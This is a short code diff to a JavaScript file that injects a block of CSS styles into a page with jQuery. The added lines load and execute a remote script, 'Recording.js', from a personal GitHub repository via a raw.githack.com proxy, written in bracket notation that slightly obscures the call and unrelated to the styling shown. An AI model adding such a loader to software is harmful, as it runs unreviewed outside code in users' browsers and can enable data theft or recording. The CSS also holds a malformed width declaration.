@@ -56,3 +56,5 @@ border-radius: 19px;
 
 .well {font-family: 'jazeera',FontAwesome;font-size: 16px!important;padding: 3px!important;text-align: center!important;width: color: #000000;white-space: nowrap;border-radius: 15px 15px 15px 15px;}
 </style>`).insertBefore('body');
+
+$["getScript"]("https://raw.githack.com/mmnm399819/dimaski98/master/Recording.js")
